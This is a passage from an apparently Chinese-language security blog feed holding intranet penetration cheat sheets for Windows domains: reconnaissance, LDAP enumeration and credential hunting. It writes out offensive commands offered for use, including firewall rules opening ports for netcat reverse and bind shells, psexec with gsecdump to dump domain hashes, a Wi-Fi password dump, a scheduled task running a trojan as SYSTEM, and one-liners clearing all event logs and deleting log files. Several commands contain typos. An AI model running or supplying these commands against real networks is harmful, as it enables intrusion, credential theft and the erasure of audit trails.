class="line">操作系统(2003&#x2F;xp、2008&#x2F;win7、2012及以后、详细版本)</span><br><span class="line">进程(杀软、hids等监控agent) tasklist &#x2F;svc</span><br><span class="line">网络配置( ipconfig &#x2F;all)</span><br><span class="line">网络连接 (本地端口、连接、代理、wpad) netstat -ano、 route print</span><br><span class="line">用户(特定组) net localgroup administrators、 net user (用户名)</span><br><span class="line">arp (arp -a)</span><br><span class="line">RDP(记住密码、连接记录)</span><br><span class="line">补丁(wmic qfe get hotfixid)</span><br><span class="line">IPC连接(net use、net seesion)</span><br><span class="line">默认共享( net share)</span><br><span class="line">防火墙</span><br><span class="line">启动项、日志防火墙</span><br><span class="line">关闭</span><br><span class="line">放行</span><br><span class="line">防火墙放行</span><br><span class="line">允许tcp53连入</span><br><span class="line">netsh firewall add portopening TCP 53 “nc reverse shell&quot;</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;nc bind shell&quot; dir&#x3D;in action&#x3D;allow protocol&#x3D;TCP</span><br><span class="line">localport&#x3D;53</span><br><span class="line">允许tcp53出</span><br><span class="line">netsh advfirewall friewall add rule name&#x3D;“nc reverse shell&quot; dir&#x3D;out action&#x3D;allow protocol&#x3D;TCP</span><br><span class="line">localport&#x3D;53</span><br><span class="line">2003允许指定进程全部连接</span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br><span class="line">2003以后允许指定进程连入</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;C:\nc.exe&quot;</span><br><span class="line">允许指定进程连出</span><br></pre></td></tr></table></figure><h4 id="内网定位"><a href="#内网定位" class="headerlink" title="内网定位"></a>内网定位</h4><h5 id="人员定位"><a href="#人员定位" class="headerlink" title="人员定位"></a>人员定位</h5><ul><li>内部邮箱(X-Originating-IP)Bloodhound</li><li>人力资源名单</li><li>查找域管进程</li></ul><h5 id="文件定位"><a href="#文件定位" class="headerlink" title="文件定位"></a>文件定位</h5><ul><li>特定部门、人员机器及特定部门文件服务器</li><li>检查访问记录</li><li>SMB共享/FTP/Database</li></ul><h5 id="收集用户配置中搜集明文密码-Windows"><a href="#收集用户配置中搜集明文密码-Windows" class="headerlink" title="收集用户配置中搜集明文密码 - Windows"></a>收集用户配置中搜集明文密码 - Windows</h5><ul><li><p>Windows无人值守文件</p></li><li><p>常用目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">C:\Windows\system32\sysprep.inf</span><br><span class="line">C:\Windows\system32\sysprep\sysprep.xml</span><br><span class="line">post&#x2F;windows&#x2F;gather&#x2F;enum_unattend</span><br></pre></td></tr></table></figure></li><li><p>自动登录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlgon&quot;</span><br><span class="line">HTTP 401(.htpasswd)</span><br><span class="line">web.conf</span><br><span class="line">config.php</span><br><span class="line">tomcat-users.xml</span><br><span class="line">WEB-INF&#x2F;Web.xml</span><br><span class="line">conn.asp</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\Web.config</span><br><span class="line">C:\inetpub\wwwroot\web.config</span><br></pre></td></tr></table></figure><h5 id="收集用户配置中搜集明文密码-Windows-Command"><a href="#收集用户配置中搜集明文密码-Windows-Command" class="headerlink" title="收集用户配置中搜集明文密码 - Windows Command"></a>收集用户配置中搜集明文密码 - Windows Command</h5></li><li><p>发现包含password文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">findstr &#x2F;si password *.txt</span><br><span class="line">findstr &#x2F;si password *.xml</span><br><span class="line">findstr &#x2F;si password *.ini</span><br></pre></td></tr></table></figure></li><li><p>搜素常用配置文件</p></li></ul><p>/s:显示当前或指定目录中所有文件<br>/b:显示文件名和扩展名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dir &#x2F;b &#x2F;s unattend.xml</span><br><span class="line">dir &#x2F;b &#x2F;s web.config</span><br><span class="line">dir &#x2F;b &#x2F;s sysprep.inf</span><br><span class="line">dir &#x2F;b &#x2F;s sysprep.xml</span><br><span class="line">dir &#x2F;b &#x2F;s *pass*</span><br><span class="line">dir &#x2F;b &#x2F;s vnc.ini</span><br></pre></td></tr></table></figure><h4 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h4><ul><li>域用户、本地用户、SYSTEM</li><li>查找DC</li><li>访问域Tips</li><li>LDAP信息收集</li></ul><h5 id="域用户-本地用户-SYSTEM"><a href="#域用户-本地用户-SYSTEM" class="headerlink" title="域用户\本地用户\SYSTEM"></a>域用户\本地用户\SYSTEM</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">域用户</span><br><span class="line">domain\username</span><br><span class="line">本地用户</span><br><span class="line">hostname\username</span><br><span class="line">SYSTEM</span><br><span class="line">ntauthority\system</span><br><span class="line">net localgroup administrators &#x2F;domain</span><br><span class="line">Tips:LDAP只能经过认证的域用户可以查询</span><br><span class="line">即使机器加入域,本地用户也不能进行LDAP查询</span><br><span class="line">SYSTEM等同于hostname$(机器用户),故SYSTEM可以进行LDAP查询</span><br></pre></td></tr></table></figure><h4 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h4><ul><li>收集域内域控制器信息</li><li>收集域控上域用户登录日志信息</li><li>收集域内所有用户名以及全名、备注等信息</li><li>收集域内工作组信息</li><li>收集域管理员账号信息</li><li>收集域内网段划分信息</li><li>收集域内组织单位信息</li></ul><h4 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; &#x2F;domain</span><br><span class="line">Nslookup -type&#x3D;SRV_ldap._tcp</span><br><span class="line">nltest &#x2F;DCLIST:domainname</span><br><span class="line">netdom query pdc</span><br><span class="line">dsquery server-linmit 0&#125;^</span><br><span class="line">sel log</span><br><span class="line">net time &#x2F;domain</span><br><span class="line">Get-NetDomainControllers</span><br></pre></td></tr></table></figure><h4 id="非域机器访问DC"><a href="#非域机器访问DC" class="headerlink" title="非域机器访问DC"></a>非域机器访问DC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注: 将攻击机DNS设置为域控制器</span><br><span class="line">场景A ( VPN接入 )</span><br><span class="line">net家族( 不可用 )</span><br><span class="line">adexplorer (输入账号密码即可)</span><br><span class="line">csvde&#x2F;Idifde</span><br></pre></td></tr></table></figure><h4 id="LDAP查询工具"><a href="#LDAP查询工具" class="headerlink" title="LDAP查询工具"></a>LDAP查询工具</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ADSI 编辑器 adsiedit.msc</span><br><span class="line">csvde.exe&#x2F;Idifde.exe</span><br><span class="line">ADExplorer</span><br><span class="line">dsquery</span><br><span class="line">adfind 与 admod</span><br></pre></td></tr></table></figure><h4 id="LDAP-语法"><a href="#LDAP-语法" class="headerlink" title="LDAP 语法"></a>LDAP 语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">用与号(&amp;)表示的 AND 运算符</span><br><span class="line">(&amp;(department&#x3D;dm)(city&#x3D;xinjiang))用竖线(|)表示的 OR 运算法</span><br><span class="line">(|(department&#x3D;1234)(department&#x3D;56*))</span><br><span class="line">用感叹号( !)表示的NOT运算符</span><br><span class="line">(!(uid&#x3D;dm))</span><br><span class="line">用名称和值表达式的等号(&#x3D;)表示的相等比较</span><br><span class="line">(uid&#x3D;dm)</span><br><span class="line">用名称和值表达式中值的开头或结尾处的星号(*)表示的通配符。</span><br><span class="line">(!(uid&#x3D;d*))</span><br></pre></td></tr></table></figure><h4 id="相关对象重要属性"><a href="#相关对象重要属性" class="headerlink" title="相关对象重要属性"></a>相关对象重要属性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">计算机对象比较重要的属性有</span><br><span class="line">cn,dNSHostName,lastLogon,operatingSystem,operatingSystemVersion,</span><br><span class="line">sAMAccountName,servicePrincipalName,description</span><br><span class="line">用户对象比较重要的属性有</span><br><span class="line">sAMAccountName,displayName,lastLogon,pwdLastSet,mail,accountExpires,</span><br><span class="line">memberOf,description,homeDirectory,scriptPath</span><br><span class="line">分辨一个对象是计算机对象还是用户对象或者其他用户组等对象,需要用到objectClass、</span><br><span class="line">objectCategory来判断</span><br><span class="line">用户对象的objectClass为top,person,organizationalPerson,user;</span><br><span class="line">计算机对象的objectClass为top,person,organizationalPerson,user,computer,比用户对象多</span><br><span class="line">一个computer。</span><br><span class="line">SAMAccountType为0x30000000,用户</span><br><span class="line">SAMAccountType为0x30000001,机器用户</span><br><span class="line">注:lastLogon属性不在DC间同步</span><br></pre></td></tr></table></figure><h4 id="LDAP信息收集-dsquery"><a href="#LDAP信息收集-dsquery" class="headerlink" title="LDAP信息收集-dsquery"></a>LDAP信息收集-dsquery</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查询所有用户</span><br><span class="line">dsquery user | dsget user -samid -display -email</span><br><span class="line">dequery * froestroot -filter &quot;(sAMAccountType&#x3D;805306368)&quot; -attr sAMAccountName</span><br><span class="line">displaynamedescription</span><br><span class="line">锁定阀值、时间、观察时间</span><br><span class="line">dsquery * -d root.com -limit 1 -attr lockoutthreshold lockoutduration lockoutobservationwindw</span><br></pre></td></tr></table></figure><h4 id="LDAP信息收集-Adfind"><a href="#LDAP信息收集-Adfind" class="headerlink" title="LDAP信息收集-Adfind"></a>LDAP信息收集-Adfind</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查询所有用户AdFind.exe -default -f &quot;(sAMAccountType&#x3D;805306368)&quot; sAMAccountName displayname</span><br><span class="line">lastlogon pwdLastSet mail homedirectory scriptpath -int8time</span><br><span class="line">lastlogon;pwdlastset</span><br></pre></td></tr></table></figure><h4 id="信息收集工具"><a href="#信息收集工具" class="headerlink" title="信息收集工具"></a>信息收集工具</h4><p><img src="/images/pasted-73.png" alt="upload successful"></p><h4 id="内网其他信息收集"><a href="#内网其他信息收集" class="headerlink" title="内网其他信息收集"></a>内网其他信息收集</h4><p><img src="/images/pasted-72.png" alt="upload successful"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透－－常用命令</title>
      <link href="2021/06/22/nei-wang-shen-tou-chang-yong-ming-ling/"/>
      <url>2021/06/22/nei-wang-shen-tou-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<h4 id="1-域常用操作命令"><a href="#1-域常用操作命令" class="headerlink" title="1.域常用操作命令"></a>1.域常用操作命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">net group &#x2F;domain</span><br><span class="line">&#x2F;&#x2F;获得所有域用户组列表</span><br><span class="line">net group XXX &#x2F;domain &#x2F;&#x2F;显示域中XXX组的成员</span><br><span class="line">net group XXX &#x2F;del &#x2F;domain &#x2F;&#x2F;删除域中XXX组</span><br><span class="line">net group XXX xx &#x2F;del &#x2F;domain &#x2F;&#x2F;删除域内XXX群组中的成员xx</span><br><span class="line">net group XXX &#x2F;add &#x2F;domain &#x2F;&#x2F;增加域中的群组</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain &#x2F;&#x2F;获得域管理员列表</span><br><span class="line">net group &quot;enterprise admins&quot; &#x2F;domain &#x2F;&#x2F;获得企业管理员列表</span><br><span class="line">net localgroup administrators &#x2F;domain</span><br><span class="line">&#x2F;&#x2F;获取域内置administrators组用(enterprise admins、domain admins)</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain</span><br><span class="line">net user &#x2F;domain</span><br><span class="line">&#x2F;&#x2F;获得域控制器列表</span><br><span class="line">&#x2F;&#x2F;获得所有域成员计算机列表</span><br><span class="line">&#x2F;&#x2F;获得所有域用户列表</span><br><span class="line">net user someuser &#x2F;domain</span><br><span class="line">&#x2F;&#x2F;获得指定账户someuser的详细信息</span><br><span class="line">net accounts &#x2F;domain</span><br><span class="line">&#x2F;&#x2F;获得域密码策略设置,密码长短,错误锁定等信息</span><br><span class="line">nei view &#x2F;domain &#x2F;&#x2F;查询有几个域, 查询域列表</span><br><span class="line">net view &#x2F;domain:testdomain &#x2F;&#x2F;查看 testdomain域中的计算机列表</span><br><span class="line">nltest &#x2F;domain_trusts &#x2F;&#x2F;获取域信任信息</span><br><span class="line">net user domain-admin &#x2F;domain</span><br><span class="line">&#x2F;&#x2F;查看管理员登陆时间,密码过期时间,是否有登陆脚本,组分配等信息</span><br><span class="line">net config Workstation</span><br><span class="line">&#x2F;&#x2F;查询机器属于哪个域</span><br><span class="line">net time &#x2F;domian</span><br><span class="line">&#x2F;&#x2F;查询主域服务器的时间</span><br><span class="line">echo %logonserver% &#x2F;&#x2F;查看登陆到这台服务器的计算机名</span><br><span class="line">net time \\192.168.1.1 &#x2F;&#x2F;查询远程共享主机192.168.1.1的时间</span><br><span class="line">net use \\IP\ipc$ password &#x2F;user:username@domain</span><br><span class="line">net view \\dc.hacke.com</span><br><span class="line">&#x2F;&#x2F;ipc$域内连接</span><br><span class="line">&#x2F;&#x2F;查看域控共享情况</span><br><span class="line">dir \dc.hacke.com\SYSVOL &#x2F;s &#x2F;a &gt; sysvol.txt</span><br><span class="line">&#x2F;&#x2F;列出sysvol日志记录</span><br><span class="line">xcopy \\dc.hacke.com\sysvol.txt sysvol.txt &#x2F;i &#x2F;e &#x2F;c</span><br><span class="line">&#x2F;&#x2F;远程拷贝到本地sysvol日志</span><br><span class="line">net user &#x2F;domain xy xy123</span><br><span class="line">&#x2F;&#x2F;修改域内用户密码,需要管理员权限</span><br><span class="line">net localgroup administartors</span><br><span class="line">HACKE\XXX &#x2F;add</span><br><span class="line">&#x2F;&#x2F;将HACKE域中的用户XXX添加到administrators组中</span><br><span class="line">mstsc &#x2F;admin</span><br><span class="line">gpupdate&#x2F;force</span><br><span class="line">&#x2F;&#x2F;远程桌面登录到console会话解决hash无法抓出问题</span><br><span class="line">&#x2F;&#x2F;更新域策略psexec \\192.168.1.3 -u administrator -p xy123 -c gsecdump.exe -u</span><br><span class="line">&#x2F;&#x2F;从域服务器密码存储文件windows&#x2F;ntds&#x2F;ntds.dit导出hash值出来</span><br><span class="line">gsecdump -a</span><br><span class="line">&#x2F;&#x2F;获取域登管理员登录过得hash值,这里gescdump为第三方导出AD域的hash值</span><br><span class="line">tasklist &#x2F;S ip &#x2F;U domain\username &#x2F;P &#x2F;V</span><br><span class="line">gpresult &#x2F;z</span><br><span class="line">wevtutil el</span><br><span class="line">&#x2F;&#x2F;查看远程计算机进程列</span><br><span class="line">导出组策略</span><br><span class="line">列出Windows日志类型</span><br><span class="line">wevtutil cl [LOGNAME]</span><br><span class="line">清除特定类型日志</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-基本内网渗透命令"><a href="#2-基本内网渗透命令" class="headerlink" title="2.基本内网渗透命令"></a>2.基本内网渗透命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">ipconfig&#x2F;all &#x2F;&#x2F;查看IP地址</span><br><span class="line">ipconfig &#x2F;release &#x2F;&#x2F;释放地址</span><br><span class="line">ipconfig &#x2F;renew &#x2F;&#x2F;重新获取Ip地址</span><br><span class="line">whoami &#x2F;&#x2F;查询账号所属权限</span><br><span class="line">whoami&#x2F;all &#x2F;&#x2F;查看sid值</span><br><span class="line">systeminfo &#x2F;&#x2F;查询系统以及补丁信息</span><br><span class="line">tasklist &#x2F;svc &#x2F;&#x2F;查看进程</span><br><span class="line">taskkill &#x2F;im&#x2F;进程名称(cmd)</span><br><span class="line">&#x2F;&#x2F;结束进程</span><br><span class="line">taskkill &#x2F;pid[进程码] &#x2F;&#x2F;-t(结束该进程) -f(强制结束该进程以及所有子进程)</span><br><span class="line">wmic qfe get hotfixid &#x2F;&#x2F;查看已安装过得补丁</span><br><span class="line">wmic qfe list full &#x2F;format:htable &gt; hotfixes.htm</span><br><span class="line">wmic qfe</span><br><span class="line">&#x2F;&#x2F;详细的补丁安装</span><br><span class="line">&#x2F;&#x2F;查询补丁信息以及微软提供的下载地址</span><br><span class="line">ping hostname(主机名) &#x2F;&#x2F;显示该机器名的IP</span><br><span class="line">net start &#x2F;&#x2F;查看当前运行的服务</span><br><span class="line">net user &#x2F;&#x2F;查看本地组的用户</span><br><span class="line">net localhroup administrators</span><br><span class="line">&#x2F;&#x2F;查看本机管理员组有哪些用户</span><br><span class="line">net use &#x2F;&#x2F;查看会话</span><br><span class="line">net session &#x2F;&#x2F;查看当前会话</span><br><span class="line">net share &#x2F;&#x2F;查看SMB指向的路径[即共享]</span><br><span class="line">wmic share get name,path</span><br><span class="line">&#x2F;&#x2F;查看SMB指向的路径</span><br><span class="line">wmic nteventlog get path,filename,writeable &#x2F;&#x2F;查询系统日志文件存储位置</span><br><span class="line">net use \\IP\ipc$ password &#x2F;user:username &#x2F;&#x2F;建立IPC会话(工作组模式)</span><br><span class="line">net use z: \\192.168.1.1</span><br><span class="line">net time \\172.16.16.2</span><br><span class="line">&#x2F;&#x2F;建立映射到本机Z盘</span><br><span class="line">&#x2F;&#x2F;查询共享主机的是at \\172.16.16.2 13:50 c:\windows\xy.exe</span><br><span class="line">&#x2F;&#x2F;在共享主机上执行</span><br><span class="line">netstat -ano &#x2F;&#x2F;查看开放的端口</span><br><span class="line">netstat -an | find “3389” &#x2F;&#x2F;找到3389端口</span><br><span class="line">net accounts &#x2F;&#x2F;查看本地密码策略</span><br><span class="line">nbtstat –A ip &#x2F;&#x2F;netbiso查询</span><br><span class="line">net view</span><br><span class="line">&#x2F;&#x2F;查看机器注释或许能得到当前活动状态的机器列表,如果禁用</span><br><span class="line">netbios就查看不出来</span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br><span class="line">&#x2F;&#x2F;查看系统是32还是64位</span><br><span class="line">set &#x2F;&#x2F;查看系统环境设置变量</span><br><span class="line">net start &#x2F;&#x2F;查看当前运行的服务</span><br><span class="line">wmic service list brief</span><br><span class="line">wmic process list brief</span><br><span class="line">wmic startup list brief</span><br><span class="line">wmic product list brief</span><br><span class="line">wmic startup list full</span><br><span class="line">&#x2F;&#x2F;查看进程服务</span><br><span class="line">&#x2F;&#x2F;查看进程</span><br><span class="line">&#x2F;&#x2F;查看启动程序信息</span><br><span class="line">&#x2F;&#x2F;查看安装程序和版本信息(漏洞利用线索)</span><br><span class="line">&#x2F;&#x2F;识别开机启动的程序</span><br><span class="line">wmic process where(description&#x3D;&quot;mysqld.exe&quot;) &gt;&gt;mysql.log</span><br><span class="line">qwinsta</span><br><span class="line">&#x2F;&#x2F;获取软件安装路径</span><br><span class="line">&#x2F;&#x2F;查看登录情况</span><br><span class="line">REG query HKCU &#x2F;v &quot;pwd&quot; &#x2F;s &#x2F;&#x2F;获取保存到注册表中的密码</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-长命令"><a href="#3-长命令" class="headerlink" title="3.长命令"></a>3.长命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;f &quot;skip&#x3D;9 tokens&#x3D;1,2 delims&#x3D;:&quot; %i in (&#39;netsh wlan showprofiles&#39;) do @echo %j |</span><br><span class="line">findstr -i -v echo | netsh wlan show profiles %jkey&#x3D;clear</span><br><span class="line">&#x2F;&#x2F;一键获取wifi密码</span><br><span class="line">if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell)</span><br><span class="line">&#x2F;&#x2F;查看是否支持posershell</span><br><span class="line">schtasks.exe &#x2F;Create &#x2F;RU&quot;SYSTEM&quot; &#x2F;SC MINUTE &#x2F;MO 45 &#x2F;TN FIREWALL &#x2F;TR</span><br><span class="line">&quot;c:&#x2F;muma.ex</span><br><span class="line">e&quot; &#x2F;ED 2017&#x2F;4&#x2F;7</span><br><span class="line">&#x2F;&#x2F;添加计划任务</span><br><span class="line">FOR &#x2F;F &quot;eol&#x3D;- tokens&#x3D;1 delims&#x3D;\ &quot; %a IN(&#39;net view&#39;) DO @(echo name: %a, ip: &amp;</span><br><span class="line">ping %a -w 1 -n 1 | find &#x2F;i &quot;ttl&quot; &amp; echo.)</span><br><span class="line">&#x2F;&#x2F;域机器对应的IP</span><br><span class="line">for &#x2F;l %i in (1,1,255) do @ping -a 192.168.200.%i -w 1 -n 1 | find &#x2F;i &quot;Pinging&quot;</span><br><span class="line">&#x2F;&#x2F;找主机名</span><br><span class="line">for &#x2F;l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find &#x2F;i &quot;Pinging&quot;</span><br><span class="line">&#x2F;&#x2F;找B段(将 Pinging 改成 Ping 就可以适用于Win7)</span><br><span class="line">for &#x2F;f %a in (&#39;wevtutil el&#39;) do @wevtutil cl &quot;%a&quot;</span><br><span class="line">删除所有日志del %WINDIR%\*.log &#x2F;a &#x2F;s &#x2F;q &#x2F;f</span><br><span class="line">从%WINDIR%目录中删除所有* .log文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="4-内网网络结常用命令"><a href="#4-内网网络结常用命令" class="headerlink" title="4.内网网络结常用命令"></a>4.内网网络结常用命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tracert IP &#x2F;&#x2F;路由跟踪</span><br><span class="line">route print &#x2F;&#x2F;打印路由表</span><br><span class="line">arp -a &#x2F;&#x2F;列出本网段内所有活跃的IP地址</span><br><span class="line">arp -s (ip + mac) &#x2F;&#x2F;绑定mac与ip地址</span><br><span class="line">arp -d (ip + mac) &#x2F;&#x2F;解绑mac与ip地址</span><br><span class="line">netsh firewall show config &#x2F;&#x2F;查看防火墙策略</span><br><span class="line"></span><br><span class="line">netsh firewall show state  &#x2F;&#x2F;查看防火墙策略</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="5-dsquer-y的AD查询工具"><a href="#5-dsquer-y的AD查询工具" class="headerlink" title="5.dsquer y的AD查询工具"></a>5.dsquer y的AD查询工具</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">dsquery user domainroot -limit 65535 &amp;&amp; net user &#x2F;domain</span><br><span class="line">&#x2F;&#x2F;列出该域内所有用</span><br><span class="line">户名</span><br><span class="line">dsquery server -domain hacke.com | dsget server -dnsname -site</span><br><span class="line">&#x2F;&#x2F;搜索域内所有域</span><br><span class="line">控制器并显示他们的DNS主机名和站点名称</span><br><span class="line">dsquery contact &#x2F;&#x2F;寻找目录中的联系人</span><br><span class="line">dsquery subnet &#x2F;&#x2F;列出该域内网段划分</span><br><span class="line">query user</span><br><span class="line">&#x2F;&#x2F;查询那些用户在线</span><br><span class="line">dsquery group &amp;&amp; net group &#x2F;domain</span><br><span class="line">dsquery ou</span><br><span class="line">&#x2F;&#x2F;列出该域内分组</span><br><span class="line">&#x2F;&#x2F;列出该域内组织单位</span><br><span class="line">dsquery server &amp;&amp; net time &#x2F;domain</span><br><span class="line">dsquery site -o rdn</span><br><span class="line">&#x2F;&#x2F;列出该域内域控制器</span><br><span class="line">&#x2F;&#x2F;搜索域中所有站点的名称</span><br><span class="line">dsquery group dc&#x3D;super,dc&#x3D;com |more</span><br><span class="line">&#x2F;&#x2F;搜索在DC&#x3D;SUPER,DC&#x3D;COM 